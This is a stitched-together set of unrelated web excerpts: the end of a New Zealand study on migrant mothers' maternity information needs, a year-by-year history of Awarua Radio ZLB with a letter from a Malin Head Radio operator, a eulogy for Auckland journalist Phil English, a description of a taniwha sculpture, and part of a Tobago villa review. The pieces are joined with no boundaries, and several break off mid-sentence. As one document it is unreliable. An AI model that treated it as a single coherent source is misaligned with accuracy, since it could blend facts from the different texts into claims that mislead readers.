study: Research is needed on cross-cultural and intercultural communication in particular on the nature and impact on Culturally and Linguistically Diverse (CALD) people not being able to communicate with service providers; not being able to get information and explanations about &#x2018;what is going on&#x2019;; not being able to get information in a timely manner; not being given information in a culturally appropriate manner; not being given any information at all; being given too much information; being given unwanted information (Johnstone &amp; Kanitsaki, 2005, p.15).</p>   <p><strong>Preparing women for new discourses of maternity</strong> The study findings highlight the need for health providers to assist women socialise into new discourses in particular the discourse of partnership and the informed consumer. A useful mechanism for socialising women into an informed consumer discourse is to provide multi- lingual antenatal classes. Many women in this study felt the need for specific and detailed information in order to make the best choice but some women also wanted to be told the best option. The facilitative role of health providers was called into question with some participants wanting their LMC to have a more authoritative style. The partnership model underpinning midwifery in New Zealand maternity services assumes that midwives bring their knowledge, skills and experience and women brings their knowledge of themselves and their families to the relationship. This is intended to be a collaborative and empowering relationship but it requires that the woman wants the responsibility of being an informed consumer. It appears that the notion of partnership cannot contain women who don&#x2019;t want the equal responsibility that is required. In addition, one needs to be information literate in order to take this role on (Henwood, Wyatt, Hart, &amp; Smith, 2003).</p>   <p><strong>Developing fluency</strong> Lack of English language proficiency impacts on access to health care, employment prospects, income levels and other factors which determine health status (Asian Public Health Project Team, 2003).The link between language and accessing health care is further strengthened by the findings of a New Zealand study where self-rated fair or poor health was found to be associated with Chinese-only reading knowledge, residency of more than five years and regretting having come to New Zealand (Abbott, Wong, Williams, Au, &amp; Young, 2000). While a study of Chinese American women which found that lack of English language ability was a major barrier to access (Liang, Yuan, Mandelblatt, &amp; Pasick, 2004). Ensuring that migrants are aware of Language line and encouraging them to take up their English for Migrants language courses, as proficiency is a key settlement enhancer. The migrant levy that migrants pay when coming to New Zealand entitles migrants to take up English language classes (English for Migrants). The Tertiary Education Commission pays for English language tuition on behalf of migrants to New Zealand who have pre-paid for their training, recent news reports indicate that few migrants take up these classes.</p>   <p><strong>Developing health literacy</strong> The development of health literacy among health care recipients is gaining prominence as a health promotion strategy. Health literacy is defined by the World Health Organisation as &#x201c; the cognitive and social skills which determine the motivation and ability of individuals to gain access to, understand, and use information in ways that promote and maintain good health&#x201d; (World Health Organization, 1998, p.10). Health literacy is a stronger predictor of health status than socio-economic status, age, or ethnic background (Speros, 2005). Speros claims that the lack of health literacy can act as a barrier to navigating the system and functioning successfully as a consumer, presumably then the combination of socio-economic status, ethnic background and low health literacy compound the issues of access. Speros cites a large study by Williams et al. (1995) which found that one-third of English -speaking patients at two public hospitals in the USA could not read and understand basic health-related materials. Sixty per cent could not understand a routine consent form, 26% could not understand information written on an appointment slip, and 42% failed to comprehend directions for taking medications. While little is known about health literacy is known in New Zealand, overseas research suggests that being culturally and linguistically different magnifies the problem.</p>   <p><strong>Conclusion </strong> This study highlights the importance of information provision for health care consumers, in particular migrant mothers. The study shows that migrant women frequently experience a vacuum of knowledge that needs to be filled. Factors such as poor English language proficiency, limited networks and unresponsive health providers can all increase the likelihood of migrant mothers experiencing a problematic birth experience and poor outcomes. This research suggests that improving the quality and range of information for migrant mothers and the inter-cultural resources for health providers could improve outcomes.</p>   <p>Further research is needed into how maternity information is provided and it is suggested that more attention is paid to the information needs of migrant mothers and migrants in general. Language proficiency is vital not only with regard to access to services but also for being empowered and prepared for the dual transition of parenthood in a new country. The study highlights the need for further exploration of changing demographics on dominant health care discourses in New Zealand such as partnership and whether there is space for new discourses. There are several aspects that contribute to a satisfying experience of health care for migrant mothers and these appear to be the ability to access a service, being able to obtain relevant information and having a supportive relationship between themselves and providers. These appear to be mutually dependent factors.</p>   <p><strong>Acknowledgements </strong></p>   <p>Funding for this research was provided by grants from The Families Commission and the Plunket Society volunteers in Central <b>Auckland</b>.

An additional farm residence was completed and a bus shelter on Bluff Road provided. Staff establishment increased to 29 10/40. ZLG Haast ceased w/t working and changed to telephone working.</p>   <p><strong>1971</strong> &#x2013; ZMV/Milford Sound landline completed, r/t retained as emergency link. Ellie Ellenden retired in January. Gentex operational 21 May. JF Ryan took over as Superintendent on 24th May. The position was regraded to Class Special 3 on 1st April, and Senior Supervisor Class Special 1.</p>   <p><strong>1972</strong> &#x2013; September, the area commercial QSP system ceased, through being unacceptable on defence communications network. Overseas traffic now routed through commercial cable systems.</p>   <p><strong>1973</strong> &#x2013; 16 MHz watch opened 0880 to 1800 hours NZST. On 16th July discontinued HF broadcasting of outward traffic. All HF traffic (inward and outward) now centred at ZLB.</p>   <p><strong>1974</strong> &#x2013; February JF Ryan, Superintendent, transferred to PO HQ. In March HJ Milne (Ex ZLD) was appointed Superintendent. On 1st April designation of Superintendent changed to Manager. In May ZLB opened up a request service on 4 &amp; 6 MHz. In June HJ Milne retired, and was replaced by .</p>   <p>September saw a new &#x2018;Small Ships&#x2019; room added with a new table designed and constructed locally. Also in September RN McVicar (Superintendent at ZLD) was appointed Senior Supervisor at Awarua, but in October he declined. In October the nightly 8 MHz sked with KFS ceased, rendered unnecessary by telex facilities.</p>   <p>ZLB had operating teleprinters to ZLO, ZLW, Gentex, and Telex (installed for Schmitt Ocean Towage, Rotterdam, who were engaged in tug work with Penrod 2 oil drilling rig).</p>   <p><strong>1975</strong> &#x2013; On 28th January a fifth supervisor&#x2019;s position was approved, and in July a third operating unit for leave relief approved. July 31st VJM Macquarie Island CW meteorological skeds discontinued when Australians installed teleprinters. From 1st May to 30 September 4 MHz HF watch opened 0700-1900 GMT daily and 12 MHz closed at these times. On October 28 <strong>Malin Head Radio</strong> (51N &#x2013; 19W) heard working a distress on 2182 kHz. November 6th daily sked at 1130 with VJS discontinued. Penrod 2 now drilling in Foveaux Strait, rig working r/t for Met traffic.</p>   <blockquote>    <p>Greetings from Malin Head. I read with great interest a note in the events during Awarua Radio ZLB and the following: &#x201c;On October 28 Malinhead Radio (51N &#x2013; 19W) heard working a distress on 2182 kHz.&#x201d;</p>    <p>I made a point of checking the distress records for our radio station for that date and can confirm that Malin Head Radio did indeed work distress traffic. I noted that the position given was 53 North and 19 West. This is an amazing bit of watchkeeping and must be the furthest distance for our transmitters, of the time. At that time we were using Pye transmitters, with a 5CX1500B valve in the final, running compatible AM with 500 watts carrier. We later changed to USB in the following years and ran 1 KW from SPT gear, replaced by German transmitters about 5 years ago.</p>    <p>The antenna was, and still is, 150 foot masts, one for 2182 khz and the other usually used on our working frequency of 1677 khz. The original 500 khz Tee antenna strung between the two towers is used on Navtex on 518 khz and 490 khz these days.</p>    <p>Personally, I retired just over 2 years ago, having completed 34 years at EJM, and a further 7 years before that at sea as a Radio Officer.</p>    <p>Really enjoyed your web site. I am particularly interested in 500 khz, stories of such, and recordings also of 600m/500 khz.</p>    <p>Very best regards, Finbar O&#x2019;Connor EI0CF and ex EJM (GMH)</p>   </blockquote>   <p><strong>1976</strong> &#x2013; Suspicion and alarm generated in coast stations at proposal by Director of Radio Services that coast stations transfer control to CPMs. JT Dudley appointed Manager in September. Takeover bid by CPM fails and proposal dropped in October. PJ Collett appointed Senior Supervisor in November.</p>   <p><strong>1977</strong> &#x2013; Managers seminar held in Wellington in March. 1st June spot frequency calling began on HF, but due to lack of proper equipment common channels only guarded. In November ceiling was lowered, carpet laid and new filtered fluorescent lighting added. On 11th November HF DF facility was withdrawn and Adcock DF sent to museum. In December the old <b>iron</b> horse autokeyer was sent to museum and replaced with new Model 750 teleprinter/morse converter autokeyer, all electronic.</p>   <p><strong>1978</strong> &#x2013; On 1st January, speaker watch commenced on 4125 kc/s. Codan fixed-tune receivers located in the back room for 2162, 2182, 2196, 4125, 4143.6, and 4414 kHz. In March a telephone service was introduced to Dog Island, and weather reports now passed by this medium. Female toilets were added to the retiring room.</p>   <p><strong>1979</strong> &#x2013; The Post Office gentex network changed from tape machines to page printers. In February, was linked to the mainland by telephone. Direct circuit to Wellington was no longer necessary, traffic passed via the gentex network. Direct circuit now to Kelburn Weather Office. Later in the year Eddystone digital receivers replaced the Philips, in use since 1956. JK (Bill) Riley retired 24th December.</p>   <div>    <p>Bert McKechnie in the Radio Telephone Room monitoring 2182 kHz at Awarua Radio ZLB in 1980. Notice that the microphones were on those black swing arms similar to what the light was attached to. The ash tray and yellow tobacco were par for the course back then and no big deal. Bert was the father of Brian McKechnie, a New Zealand All Black AND Test Cricketer.

   <div>   <p>Simon Moore is a highly respected Crown Prosecutor and long-time friend of the late Phil English.</p>   <p>The following is the&#xa0; eulogy he presented at the funeral service for Phil.&#xa0; Thanks to Simon and Michele Hewitson of the <em>NZ Herald</em> for sending it to me.</p>   <p><strong>Eulogy for Philip Russell English</strong></p>   <p><strong>1953 to 2011</strong></p>   <p>On the 3rd of February 1959 a tiny figure, clothed in maroon, shuffled self-consciously through the imposing brick <b>gates</b> of Kings School. At that time neither of his accompanying&#xa0;parents, Russell and Mary English, could possibly have guessed that while this event signalled their youngest son&#x2019;s formal introduction to education, their apparently unremarkable, but deeply loved, 5 year old, would in his own and utterly unique way educate&#xa0;so many of those whose lives rubbed up against his own in the 52 years which would follow. He would influence so many in those core qualities of humour and human kindness. For if there is anything which summarises Philip English it is that he was the kindest and the funniest of men.</p>   <p>Philip Russell English&#x2019;s passage through the 13 years of school which followed that event in 1959 was characterised by intense and prolonged periods of inconspicuous normality. He turned being&#xa0;inconspicuous into an art form. For him, sport and recreation held none of the allure which more prominent school boys thrived on. I am certain that if he had aspired to succeed he would have. But he found the whole sporty&#xa0;thing puzzlingly pointless. It was hard to argue against him.</p>   <p>Those 8 years at Kings Prep were sublimely happy ones. Wonderful life long friendships were forged and it is heartening, but not at all surprising, to see old friends from our Year 1 class here this afternoon and to receive messages&#xa0;of love and support&#xa0;from others like Chris and Marlene Palmer in Paris. Phil&#x2019;s nickname from those days was Pinkie. Not even Phil could remember quite why. But it stuck right through to university.</p>   <p>I well remember one afternoon standing outside the school <b>gates</b> on Remuera Rd with Phil and Ken Whitney. We&#xa0;were about to finish our last year and were discussing how much fun we had had. Surely life could not continue to be&#xa0;this much fun.</p>   <p>How right we were. It wasn&#x2019;t. We went to boarding school.</p>   <p>Phil&#x2019;s five years at the College were&#xa0;as unremarkable as his primary years. He perfected the elusive art of cultural camouflage; never drawing unnecessary attention to himself; although he did join the choir at his mother&#x2019;s insistence. Which meant that I followed. He and I chortled tunelessly from the front row of the stalls for nearly two terms before Phil was&#xa0;fired at the start of Term 3. I followed&#xa0;a fortnight later.</p>   <p>However, there are three qualities which emerged in those school years which, I am certain, were formative in terms of his later life.</p>   <p>The first was the development&#xa0;of Phil&#x2019;s fascination&#xa0;in the natural world. At primary school&#xa0;he had devoured every David Attenborough book &#xa0;ever published. After his dismal choir experiences he&#xa0;joined the Bird Club under the inspirational leadership of teacher Dick Sibson, an ornithologist of national standing. Almost certainly this experience was formative in Phil&#x2019;s&#xa0;insightful understanding of the environment whether it was Godwits at Miranda or possum control in the Waitakeres. It was this interest which decades later&#xa0;made so obvious his appointment as&#xa0;the Herald&#x2019;s environmental correspondent. He was easily&#xa0;the best they ever had because he loved the subject and truly understood the core issues around bio-diversity and sustainability long before it became fashionable.</p>   <p>The second was his natural creativity. He was a talented artist although his&#xa0;profound colour blindness&#xa0;resulted in some unusual effects especially&#xa0;after he&#xa0;made the error of trusting me to tell him which colours were which. He was also an accomplished writer.&#xa0;He loved and excelled in the subject. His career choice, even if he did not know it at the time, would prove to be a perfect forum within which to indulge those skills.</p>   <p>The third was his approach to others. He was not the sports jock. But he was popular; very popular. And that popularity flowed from his unadorned and plainly evident lack of any form of malice or self-importance. He treated everyone the same. He never had a bad word to say about anyone. He just got on with his life. Having said that, he was ruthlessly intolerant of unfairness. Where he saw unfairness he did all he could to right it. In that sense he&#xa0;displayed the same sort of moral courage which in later years we all so admired.</p>   <p>In 1972, along with just about everyone in our year it seemed, we headed to Dunedin to do Med Intermediate. Phil and I enrolled at Selwyn College. It was an utterly mad year of excess in every conceivable way. With the shackles of school conformity removed and with&#xa0;Selwyn&#x2019;s healthy&#xa0;tolerance of eccentricity,&#xa0;we were all allowed to became 9 year olds again. And so we played like 9 year olds&#x2026;.for nearly a year. It was over this time that Phil&#x2019;s wonderfully creative sense of the ridiculous began to emerge properly.</p>   <p>His musical tastes were unconventional (at least for a 19 year old in 1972). The cool music at that time consisted mainly of Leonard Cohen&#x2019;s&#xa0;dreadfully depressing dirges and Joe Cocker&#x2019;s tuneless shouting. But not so for Phil. He found Dean Martin. His favourite song was &#x201c;Little Old Wine Drinker Me&#x201d;.</p>   <p>In the interests of actually finishing this eulogy I&#xa0;shall restrict this colourful phase of Phil&#x2019;s life to&#xa0;just two stories. Each is&#xa0;quintessentially Phil.&#xa0;Each demonstrates that even before he hit 20, the unique elements&#xa0;of his personality which we all so loved&#xa0;in this man were already present&#xa0;.</p>   <p>The first was his obsession with Napoleon Bonaparte. I am uncertain how it all&#xa0;started, but Phil began to grow his side-boards and a smudge of wispy&#xa0;whiskers above his top lip. His hair (much to his alarm) was already&#xa0;starting to recede. He did, indeed, share more than just a passing resemblance to the great Emperor. To this ensemble, as&#xa0;his meagre student allowance&#xa0;permitted, he secured&#xa0;a white waistcoat, tight white pants and a blue jacket. He then added a colourful sash and an&#xa0;impressive broach made from milk bottle tops. There is a wonderful photo of Phil&#xa0;in the College magazine of that year, in&#xa0;classic Napoleonic&#xa0;pose with his right hand inside his waistcoat. He even has a glass of brandy in the other hand. This phase only ended when Phil was denied entry to the college ball on the grounds that he did not meet the dress code. He was last heard berating the bouncers for their cultural insensitivity in not recognising the formal attire of a highly ranked Frenchman.&#xa0;&#xa0;</p>   <p>The other occurred at the end of the academic year. In fact it was the final of the physics exam. Like most of us&#xa0;doing Med Intermediate, Phil found physics incomprehensible. The physics final was the last exam before we broke up for summer. We were all crammed into a hall with the usual cast of elderly ex-teacher types who are annually dragged out&#xa0;to make sure we didn&#x2019;t cheat. Phil was seated towards the front. At 9.30 the bell rang to start the exam. Like a well drilled orchestra, the sound of pages turning filled the room as we scanned the exam paper to see how many of the questions were capable of&#xa0;an answer. Phil was the first to protest publicly. Shaking his head, he slowly stood up and began to make his way to the exit. He had not got far before the chief supervisor barked out that no one was permitted to leave the exam room before one hour. Phil slowly and clearly reluctantly made his way back to his seat.</p>   <p>The last question was the only one Phil felt he could make a decent stab at. It read,</p>   <p>&#xa0;<em>&#x201c;Imagine you have a younger brother aged 11. Explain, using appropriate analogies, how Einstein&#x2019;s Theory of Relativity works&#x201d;</em></p>   <p>Phil settled himself down and began to write.</p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#x201c;Well Bob (Bob is the name of my 11 year old brother), the theory of relativity is very complicated. It took many millions of years</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;of&#xa0;human evolution to produce a man brainy enough to work it out. His name was Einstein. He had a big white bushy moustache</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;and hairy eyebrows. I know that some people say that the theory has something to do with trains passing in a railway station. </em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; I don&#x2019;t understand it and if I don&#x2019;t I can&#x2019;t see how you will&#x201d;.</em></p>   <p>Composing this answer occupied no more than 10 minutes and Phil still had at least 40 minutes to kill before he could escape. And because he was due to head home to <b>Auckland</b> the next day he decided that the most productive course would be to compile his shopping list on the paper the university had so generously supplied in the form of his exam book. This took him to 10.35. Shopping list complete, Phil got up from his seat for the second time that morning. He handed over his&#xa0;exam book&#xa0;and left.</p>   <p>A few minutes later we were all startled by a noisy ruckus at the door. It involved a heated exchange between Phil and the chief supervisor which went something like this;</p>   <p>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; <em>&#x201c;You cannot have it back. You surrendered&#xa0;your exam book&#xa0;when you left the room. I don&#x2019;t care that you have left your shopping </em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;list in it. You cannot have it back. Now please leave before I call the Proctor&#x201d;.</em></p>   <p>Not unsurprisingly, Phil&#x2019;s academic results were not quite enough to get him into Med School. But, as with everywhere he has gone in life, he made wonderful friends that year. A number are with us today. Thank you for coming.</p>   <p>It was time for a change. So Phil headed for the Kingdom of Tonga. He took up a teaching position at St Andrews School. His letters &#xa0;and tape recordings from that time are wonderfully descriptive and terribly funny. As he had done elsewhere, he&#xa0;again created around himself a cadre of close friends; fellow teachers and AFS workers from around the world. He loved Tonga. He revelled in the absurdity and contradictions&#xa0;of so much of what he saw particularly the antics of the Royal family in the midst of such poverty. Phil detested unfairness and pomposity. But&#xa0;he recognised&#xa0;the futility of trying to confront these things head on, so&#xa0;he played with them. He made quiet fun of the silliness of it all. We had wonderful descriptions of the monocled Crown Prince squeezed into his London Taxi or the vastness of the&#xa0;King lost in the back of his even&#xa0;vaster Mercedes stretch limo.</p>   <p>Tonga influenced Phil in at least three ways.</p>   <p>First, he gained his second nickname. He&#xa0;became known as &#x201c;Lampshade Phil&#x201d;.</p>   <p>Secondly, and almost certainly connected to the first, he was elected to the Presidency of the Royal Nuku&#x2019;alofa Martini Club. Martinis became Phil&#x2019;s signature cocktail and were the catalyst for some outrageously wild parties in Tonga and later back here. The mix was proscriptive. There could be no variation from the obligatory 9 gin&#xa0;to 1 Vermouth. It was mind numbing stuff.</p>   <p>Thirdly, Phil&#x2019;s musical tastes matured from Dean Martin.&#xa0;He fell in love with the discordant tones of the Fiji Police Brass Band. He bought up every recording he could get his hands on and no Martini party was complete without several tapes of the band being played. It was excruciatingly funny as the band mutilated its way through various brass tunes; some recognisable; most not.</p>   <p>On his return to New Zealand, and no doubt under pressure from Russell and Mary to get a qualification, Phil enrolled&#xa0;in the AIT&#x2019;s&#xa0;journalism course. Initially I don&#x2019;t think he was awfully keen on the idea. But in hindsight it was an inspired step because journalism indulged so many of Phil&#x2019;s core qualities. He was an excellent writer; articulate, concise and always with an eye out&#xa0;for the absurd.&#xa0;He understood the&#xa0;central importance of the fourth estate&#x2019;s role as social commentator and public scrutiniser. And he lived&#xa0;true&#xa0;to that code to the day he retired.</p>   <p>His first job was as the Coromandel correspondent at the Thames Star. It was&#xa0;there that he won the New Zealand Community Newspaper Young Reporter of the Year. It was 1977. Flushed with that success he joined the Waikato Times where he was based in Te Aroha.</p>   <p>Then, in 1979 he headed to the UK.&#xa0;He lived in&#xa0;Winchester where he worked as a reporter for the Hampshire Chronicle. In Winchester the Martini parties flourished. More life long friendships were forged. Phil established the International Martini Club and was promptly elected its President for Life. He did&#xa0;nearly three&#xa0;years with the Hampshire Chronicle before returning to New Zealand to be a groomsman at our wedding. When our first child was born there was never any question as to who would be his Godfather.</p>   <p>But we were not alone in that choice. Phil was Godfather to many others because his wide and eclectic range of friends saw in him a rare and golden sincerity. What he may have lacked in religious and moral instruction he more than made up with his deep reserves of human generosity and kindness. He was deeply loved by all the kids who revelled in his eccentricity. His presents at birthdays and at Christmas were always wonderfully&#xa0;innovative and always the best. He must have spent hours perfecting his choices.</p>   <p>With the exception of the last three years, when his health prevented him, Phil&#xa0;has been a part of every family summer holiday since Jane and I got married. His succession of cocktails was outstanding and his exotic entrees brilliant so long as there was not too great a lag between drinks and dinner. The contents of the&#xa0;boot of his beloved 1967&#xa0;Wolseley 6/110 were always the same.&#xa0;There he kept&#xa0;his tent, groundsheet, lamp, transistor radio, inflatable mattress and his cast <b>iron</b> camp oven. Every summer he would drive down to the lake, unpack&#xa0;the boot&#xa0;and set up his camp. At the end of the holiday he would pack it all up again. It would stay in the boot for the next 11 months until liberated the following summer.</p>   <p>He was a fine journalist. In fact he was a good deal better than that. He was bitterly disappointed when he was taken off the environmental portfolio and put onto the&#xa0;local body run. But his journalist instincts never slackened and in this very important role he was deadly. At Phil&#x2019;s farewell &#x201c;roast&#x201d; from the Herald in 2005, it was Mike Lee, the then Chairman of the ARC, who said about Phil;</p>   <p><em>&#xa0;&#x201c;Philip English was feared and at times perhaps&#xa0;loathed by some ARC members who objected to public scrutiny. After he was transferred to court reporting duties it turned out to be a huge setback for the Regional Council&#xa0;and the public as&#xa0;the restraining influence of&#xa0;Phil&#x2019;s watchful presence, his</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; &#xa0;close&#xa0;knowledge of the ARC and his fearless reporting of</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; &#xa0;events was never adequately filled again by&#xa0;a single&#xa0;journalist.&#x201d;</em></p>   <p>Long time friend and professional collegue, Michele Hewitson, put it perfectly when she described Phil as &#x201c;&#x2026;a very, very good journalist and any politician fooled by his Rumpole of the Bailey shuffle <em><span>was</span> </em>a fool.</p>   <p>It is heartening to see friends from his days at the Herald here.</p>   <p>Phil&#x2019;s uncanny&#xa0;knack of&#xa0;detecting and reporting on the ridiculous probably contributed to his being moved to court reporting. It had certainly made him unpopular in some quarters including the then Mayor, Colin Kay. On one occasion, after a particularly important speech, the Mayor&#x2019;s gravitas was&#xa0;seriously eroded after Phil reported that throughout the address the Mayor&#x2019;s right trouser leg was hitched above his ankle by a forgotten bicycle clip.</p>   <p>On another occasion, Phil reported the Mayor repeatedly referring to a prominent council member as &#x201c;Mr Hewi Toheroa&#x201d;.</p>   <p>As a court reporter, Phil was just as adept. He quickly gained the respect and trust of the High Court bench. He and I spent many happy hours together in court. It was a privilege and wonderful fun to work with him professionally.</p>   <p>One&#xa0;highlight was when he covered the trial of two Kings Old Boys. It was a distinguished cast of actors.&#xa0;The judge, both prosecutors and the reporter were part of this impromptu school reunion. Only the defence counsel,&#xa0;Peter Williams QC , was on the outer.</p>   <p>I must also make mention of Phil&#x2019;s many years of contribution as a Council member of the Deafness Research Foundation. He was an invaluable conduit for getting media coverage of significant research developments and lead the work on a number of public relations initiatives for the Foundation.&#xa0;It is gratifying to see so many&#xa0;from the DRF here.</p>   <p>Phil was never one to be hurried. He moved through life at his own pace. He was never flustered. Everything he did, he did with impressive deliberation. It was a quality which influenced every aspect of his life. He was also a man of habit and every Friday night he would walk up to the local Indian takeaway, Bombay Junction, owned and run by the colourful and cheerful&#xa0;Prince. According to Prince, Phil would stand at the counter pensively scratching his chin peering up at the menu board. He would mutter and mumble as he wrestled with the bewildering array of mouth-watering options which confronted him. The decision making could take up to ten minutes. Finally Phil would make his decision. This was Prince&#x2019;s cue to disappear out to the back of the shop and return with a freshly cooked Lamb Tika. Phil would look puzzled. &#x201c;That was fast. How did you do that?&#x201d; he once asked. &#x201c;Easy&#x201d; said Prince. &#x201c;You always order Lamb Tika&#x201d;.</p>   <p>Three years ago Phil was diagnosed with a progressive neurological condition with an unpronounceable name.&#xa0;His life was turned upside down. He had to move from his Parnell flat. He had to sell his beloved Wolseley. And patiently, without ever a word of complaint, a hint at self-pity&#xa0;or the slightest&#xa0;fuss, he simply wore out. It was excruciating to witness. The brunt of this horror was born by David and Caroline and I cannot record more strenuously our collective indebtedness to you both for all you did to look after Phil in his final years, particularly the last few months. 2011 has been a hell of a year for you. Only three months ago you, Robert&#xa0;and Phil lost your father Russell. Now its Phil.</p>   <p>You, together with Lucy and Sarah,&#xa0;were terribly important to Phil throughout his life. He adored you all. Robert, I also acknowledge your support and love as&#xa0;Phil&#x2019;s Sydney-based brother.&#xa0;</p>   <p>So now it is our time to bid our farewell to this extraordinary man; a man who touched so many lives in so many positive ways.</p>   <p>A man who was utterly non-judgemental, whose warmth and generosity of spirit&#xa0;should be an inspiration to us all.&#xa0;&#xa0;</p>   <p>Through his efforts he leaves the world a much richer place than it was 57 years ago when he joined it.&#xa0;</p>   <p>In every sense he was the kindest and funniest of men.</p>   <p>&#xa0;Goodbye Phil.</p>   <p>Simon Moore</p>   <p>Friday 15 July 2011</p>  </div>

At the top a natural fork has been carved into the gaping maw of a taniwha, seemingly rearing up from the depths to devour an unwary fisherman. At first glance this terrifying head has a very Polynesian look, but the teeth, eyes and scales soon resolve into cogwheels, nuts and bolts. One then notices that the base of the work is a real gearwheel. This creature does not snap - it minces and grinds.

   <div>     <div>    <div>     By the week&#x2019;s end we had found our favorite areas in the house, identified preferred dining spots, tourist attractions and grocery stores nearby, and would gladly have remained another week.    </div>   </div>   <div>     <div>     <div>      <div>       <div>        <strong>Overall Impression</strong> Villa de Lena, like Tobago, was a journey of discovery. We began the journey as curious visitors and ended it as friends. The two story $1.2 million villa occupied 374 square meters. It was well situated in a residential district near the tourist areas on the western end of Tobago. This meant our street was quiet with little traffic. At the same time we were within a five to 10 minute drive to the airport, tourist attractions, the Store Bay market and food stalls, restaurants, hotels, souvenir shops and tourist activities such as diving and water sports.        <p>The Villa was homey, spacious and designed for comfort and with island &#xe9;lan. It was a pleasant place to spend time when we felt like relaxing in between activities and discovering Tobago. The house had many doors. Opening them allowed the sea breezes in, cooling the areas downstairs (only the bedrooms were air conditioned). Each of the doors and many windows had wrought iron gates with individual locks. It took some effort initially to open and close all the doors and wrought iron gates around the house every time we went out or arrived back. By the end of the week, we had integrated those tasks into our routine and performed them easily. Although we were bitten fiercely by mosquitoes and no-see-ums in many other parts of Tobago, Villa de Lena was blissfully mosquito free during our stay.</p>        <p>Prior to our arrival on the island our interaction with Trinidad and Tobago native and villa owner Mervyn Sifontes was positive and informative. Every time we exchanged emails or spoke on the phone he was gracious and responded to our questions with patience and genuine warmth. The day after we arrived and during out stay, he called from Sweden to make sure we had everything we needed.</p>        <p>Having Internet access and satellite television was wonderful. This allowed us to check urgent messages and find out the latest news. At the same time, since the Internet service was via dial-up there was little temptation to stay online for anything but the most urgent issues. We enjoyed our stay in Villa de Lena which lent itself to poolside and indoor relaxation, providing many of the comforts of home and ample space for families of two or more to vacation together. The Villa&#x2019;s convenient central location was practical while its attractive design and clean white interior made it appealing. By the week&#x2019;s end we had found our favorite areas in the house, identified preferred dining spots, tourist attractions and grocery stores nearby, and would gladly have remained another week.</p>       </div>       <div>        <strong>Class Of Accommodation</strong> Private luxury villa        <p><strong>Connectivity</strong> There was access to the Internet via a dial-up connection on the owner&#x2019;s computer. Although it was much slower than high speed Internet access, it was good enough to check urgent messages during our time away.</p>        <p><strong>Handicapped Access</strong> A spiral tiled staircase lead to the second floor sleeping area.</p>        <p><strong>Length Of Stay</strong> One week</p>        <p><strong>Location</strong> Bon Accord district near Crown Point on the western end of Tobago </p>        <p><strong>Owned-Managed</strong> Mervyn and Lena Sifontes</p>        <p><strong>Pets Allowed</strong> No</p>        <p><strong>Size</strong> The villa had a total area of 374 square meters (approximately 3,700 square feet) and the property sat on an acre of land. The ground floor covered approximately 224 square meters and the upper floor 150 square meters. Three were three bedrooms and two and a half bathrooms on the property.</p>        <p><strong>Year Opened</strong> In 2003</p>       </div>       <div>        <strong>Common Areas</strong> The property was surrounded by a six foot white concrete wall facing the road on one side and a tall chain link fence circled the remaining side and back. Landscape gardens surrounded the house serving as home to many birds. The main entrance to Villa de Lena was next to a porte coch&#xe8;re on the side of the villa, a short drive from the entrance gates. The floor for the entire house was of 12 inch (18 in the master bedroom) white ceramic tile. The housekeeper requested we take our shoes off while in the house. There was a rack near the front door where we left our shoes. The floor inside the house was clean enough to walk barefoot.        <p>Caribbean sunlight filtered through windows and doors immersing the house in warm light through most of the day. Indoor wrought iron gates covered almost all the windows and doors. There were live (and artificial) plants peppered through the downstairs rooms. There were also fans in several of the downstairs areas including the TV room, and office dining and living rooms. Oil paintings, from Israeli, Russian and Swedish artists, hung on the walls.</p>        <p>To the right of the entrance there was a small television room housing a brown leatherette set comprising a sofa and two swivel armchairs. There was also a glass covered wood table and a 36 inch satellite TV with 50 channel options. To the left there was a 100 square foot office facing the front yard. It had a desk, office chair with wheels, book shelf, phone, fax machine, printer and Dell computer and monitor. There was a half bathroom (toilet and sink) across from the television area.</p>        <p>The soul of the house was situated in a large room, with an extra tall ceiling, at the end of the entrance hallway. Its most salient feature was a spiral staircase leading to the second story sleeping area. The room also connected to a covered garage at the foot of the staircase. To the left there was a large open kitchen and laundry room. A long wood countertop with six stools for quick meals and snacks separated the kitchen and staircase rooms. A formal dining area was next in a rounded space facing the front yard. It was home to a wood and cloth dining set for six with spare chairs. There was also a cabinet on one side and windows on three sides. To the other side there was a living area with similar furniture to the one in the TV room and a CD player. A step from there was the pool area and beyond it an oversized gazebo and back yard.</p>        <p>The second story was occupied by the sleeping quarters. There was a master suite with its own bathroom and two additional bedrooms which shared a small bathroom. Also on the second floor there was an open terrace with lounge chairs facing the backyard.</p>        <p><strong>D&#xc9;Cor</strong> The house was decorated mostly in white. The comfortable furniture was imported from Italian and Scandinavian. The d&#xe9;cor was a blend of casual European and Trinidad and Tobago styling. Trinidad architect John Yearwood, from the firm Archisis, designed Villa de Lena to be identical to another home in Trinidad.</p>       </div>       <div>        <strong>Bathroom</strong> A door led to a rectangular well lit 